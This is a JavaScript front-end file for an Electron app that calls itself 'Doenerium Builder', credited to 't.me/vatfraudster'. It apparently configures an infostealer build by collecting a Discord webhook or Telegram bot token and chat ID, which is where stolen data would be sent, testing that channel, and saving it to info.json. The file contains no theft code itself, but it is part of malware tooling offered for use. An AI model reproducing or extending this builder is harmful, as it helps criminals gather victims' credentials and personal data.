const sidebar = document.querySelector('.sidebar');
const togglebtn = document.querySelector('.toggle-btn'); 

togglebtn.addEventListener('click', () => {
    sidebar.classList.toggle('active');
});

document.addEventListener('DOMContentLoaded', () => {
    const discordInput = document.getElementById('input1');
    const telegramTokenInput = document.getElementById('input2');
    const telegramChatIdInput = document.getElementById('input3');
    const testButton = document.getElementById('testButton');
    const saveButton = document.querySelector('label[for="input-file"]');
    const helpButton = document.getElementById('helpButton');

    async function sendTestEmbed(webhookURL) {
        const testEmbed = {
            title: '**Your Webhook Works Perfectly ✅**',
            author: {
                name: 'Doenerium Builder',
                icon_url: 'https://cdn.discordapp.com/attachments/660885288079589385/1191516185573990430/948405394433253416201.png'
            },
            color: 0x303037,
            footer: {
                text: 't.me/vatfraudster | Made by @nodual',
            },
        };

        try {
            await axios.post(webhookURL, { embeds: [testEmbed] });
            console.log('Discord Webhook Test Message Sent Successfully!');
            alert('Discord Webhook Test Message Sent Successfully!');
        } catch (error) {
            console.error('Failed to send test message to Discord Webhook.', error);
            if (error.response) {
                alert(`Failed to send test message to Discord Webhook.\nStatus: ${error.response.status}\nMessage: ${error.response.data}`);
            } else {
                alert('Failed to send test message to Discord Webhook.\nError: ' + error.message);
            }
        }
    }

    async function sendTestMessage(botToken, chatId) {
        const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const testMessage = {
            chat_id: chatId,
            text: '**Your Bot Works Perfectly ✅**',
            parse_mode: 'Markdown',
        };

        try {
            await axios.post(apiUrl, testMessage);
            console.log('Telegram Bot Test Message Sent Successfully!');
            alert('Telegram Bot Test Message Sent Successfully!');
        } catch (error) {
            console.error('Failed to send test message to Telegram Bot.', error);
            if (error.response) {
                alert(`Failed to send test message to Telegram Bot.\nStatus: ${error.response.status}\nMessage: ${error.response.data.description}`);
            } else {
                alert('Failed to send test message to Telegram Bot.\nError: ' + error.message);
            }
        }
    }

    function isValidDiscordWebhookURL(url) {
        const regex = /^https:\/\/discord\.com\/api\/webhooks\/\d+\/[\w-]{68}$/;
        return regex.test(url);
    }

    function isValidTelegramBotToken(token) {
        const regex = /^\d{9,12}:[\w-]{35}$/;
        return regex.test(token);
    }

    function isValidTelegramChatID(chatID) {
    const regex = /^-?\d+$/;
    return regex.test(chatID);
    }


    function updateInputStates() {
        const discordText = discordInput.value.trim();
        const telegramTokenText = telegramTokenInput.value.trim();
        const telegramChatIdText = telegramChatIdInput.value.trim();

        if (discordText) {
            telegramTokenInput.disabled = true;
            telegramChatIdInput.disabled = true;
            telegramTokenInput.classList.add('locked');
            telegramChatIdInput.classList.add('locked');
            discordInput.disabled = false;
            discordInput.classList.remove('locked');
        } else if (telegramTokenText || telegramChatIdText) {
            discordInput.disabled = true;
            discordInput.classList.add('locked');
            telegramTokenInput.disabled = false;
            telegramChatIdInput.disabled = false;
            telegramTokenInput.classList.remove('locked');
            telegramChatIdInput.classList.remove('locked');
        } else {
            discordInput.disabled = false;
            telegramTokenInput.disabled = false;
            telegramChatIdInput.disabled = false;
            discordInput.classList.remove('locked');
            telegramTokenInput.classList.remove('locked');
            telegramChatIdInput.classList.remove('locked');
        }
    }

    discordInput.addEventListener('input', updateInputStates);
    telegramTokenInput.addEventListener('input', updateInputStates);
    telegramChatIdInput.addEventListener('input', updateInputStates);
    function saveInfo() {
        const discordWebhookURL = discordInput.value.trim();
        const telegramBotToken = telegramTokenInput.value.trim();
        const telegramChatID = telegramChatIdInput.value.trim();
        if (discordWebhookURL && isValidDiscordWebhookURL(discordWebhookURL) || 
            (telegramBotToken && isValidTelegramBotToken(telegramBotToken) && telegramChatID && isValidTelegramChatID(telegramChatID))) {
            localStorage.setItem('discordWebhookURL', discordWebhookURL);
            localStorage.setItem('telegramBotToken', telegramBotToken);
            localStorage.setItem('telegramChatID', telegramChatID);

            const data = {
                discordWebhookURL: discordWebhookURL,
                telegramBotToken: telegramBotToken,
                telegramChatID: telegramChatID
            };

            const fs = require('fs');
            const path = require('path');

            fs.writeFile(path.join(__dirname, '..', 'info.json'), JSON.stringify(data, null, 2), (err) => {
                if (err) {
                    console.error('Failed to save info to JSON file.', err);
                    alert('Failed to save info to JSON file.');
                } else {
                    console.log('Information saved to JSON file successfully!');
                    alert('Information saved successfully!');
                }
            });
        } else {
            alert('Please provide a valid Discord Webhook URL or valid Telegram Bot Token and Chat ID before saving.');
        }
    }

    // Add event listener for the "Save" button
    saveButton.addEventListener('click', () => {
        saveInfo();
    });

    // Add event listener for the "Test" button
    testButton.addEventListener('click', () => {
        const discordWebhookURL = discordInput.value.trim();
        const telegramBotToken = telegramTokenInput.value.trim();
        const telegramChatID = telegramChatIdInput.value.trim();

        if (discordWebhookURL && isValidDiscordWebhookURL(discordWebhookURL)) {
            sendTestEmbed(discordWebhookURL);
        } else if (discordWebhookURL) {
            alert('Please provide a valid Discord Webhook URL.');
        }

        if (telegramBotToken && isValidTelegramBotToken(telegramBotToken) && telegramChatID && isValidTelegramChatID(telegramChatID)) {
            sendTestMessage(telegramBotToken, telegramChatID);
        } else if (telegramBotToken || telegramChatID) {
            alert('Please provide a valid Telegram Bot Token and Chat ID.');
        }

        if (!discordWebhookURL && (!telegramBotToken || !telegramChatID)) {
            alert('Please provide at least one valid webhook URL or bot token and chat ID.');
        }
    });

    updateInputStates();
});

function openHelp(type) {
    const urls = {
        discord: 'https://youtu.be/fKksxz2Gdnc?si=T3rRJJ-pR5o74zG1',
        telegramToken: 'https://t.me/BotFather',
        telegramChat: 'https://t.me/chatIDrobot'
    };

    const url = urls[type];
    if (url) {
        require('electron').shell.openExternal(url);
    }
}

function showHelpMessage() {
    alert('Click on the question mark icons (?) next to each input field for more information.');
}

document.getElementById('helpButton').addEventListener('click', showHelpMessage);
